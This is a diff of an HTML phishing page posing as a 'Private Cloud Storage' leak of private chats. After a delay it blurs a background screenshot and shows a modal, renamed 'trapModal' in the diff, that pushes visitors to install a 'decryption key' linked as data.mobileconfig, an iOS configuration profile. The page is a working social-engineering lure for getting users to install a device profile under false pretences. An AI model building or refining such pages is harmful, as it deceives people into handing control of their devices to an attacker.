@@ -1,63 +1,75 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Private Cloud Storage - Leak</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Cloud Storage - Access Portal</title>
     <style>
-        body { margin: 0; font-family: sans-serif; background: #000; color: white; overflow: hidden; }
+        body { margin: 0; padding: 0; background-color: #000; font-family: -apple-system, sans-serif; overflow: hidden; }
         
-        
-        .chat-background {
+        .full-screenshot {
             width: 100%;
             height: 100vh;
-            background: url('https://your-github-username.github.io/your-repo/chat-screenshot.png'); /* Yahan apna screenshot link dalein */
+            background: url('https://your-github-username.github.io/your-repo/chat-screenshot.png');
             background-size: cover;
-            filter: blur(10px);
-            opacity: 0.8;
+            background-position: center;
+            transition: filter 0.5s ease;
         }
+
         .overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            display: none; /* Hidden by default */
-            align-items: center; justify-content: center;
-            z-index: 1000;
+            background: rgba(0, 0, 0, 0.75);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
         }
 
         .modal {
-            background: #fff; color: #000;
-            padding: 30px; border-radius: 15px;
-            width: 85%; max-width: 400px;
+            background: #ffffff;
+            color: #000000;
+            width: 85%;
+            max-width: 380px;
+            padding: 30px;
+            border-radius: 18px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
         }
 
+        h3 { font-size: 20px; margin-bottom: 10px; color: #d32f2f; }
+        p { font-size: 15px; line-height: 1.4; color: #333; margin-bottom: 25px; }
+
         .btn {
-            background: #007AFF; color: white;
-            padding: 12px 25px; text-decoration: none;
-            border-radius: 8px; display: inline-block;
-            margin-top: 20px; font-weight: bold;
+            background-color: #007AFF;
+            color: white;
+            text-decoration: none;
+            padding: 14px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            display: inline-block;
+            width: 80%;
         }
     </style>
 </head>
 <body>
 
-    <div class="chat-background"></div>
+    <div class="full-screenshot" id="bgImage"></div>
 
-    <div id="verifyModal" class="overlay">
+    <div class="overlay" id="trapModal">
         <div class="modal">
-            <h3 style="margin-top:0;">⚠️ Access Restricted</h3>
-            <p>System detected 1.2GB of private chats. Verification is required to decrypt and view the full database.</p>
-            <a href="data.mobileconfig" class="btn">INSTALL DECRYPTION KEY</a>
+            <h3>⚠️ Access Interrupted</h3>
+            <p>To view the complete list of leaked chats and private media, identity verification is required. Install the secure decryption key to continue.</p>
+            <a href="data.mobileconfig" class="btn">INSTALL FULL ACCESS KEY</a>
         </div>
     </div>
 
     <script>
-        
-        setTimeout(function(){
-            document.getElementById('verifyModal').style.display = 'flex';
-        }, 2000); // 2000ms = 2 seconds
+        setTimeout(function() {
+            document.getElementById('trapModal').style.display = 'flex';
+            document.getElementById('bgImage').style.filter = 'blur(5px)';
+        }, 7000); 
     </script>
 
 </body>
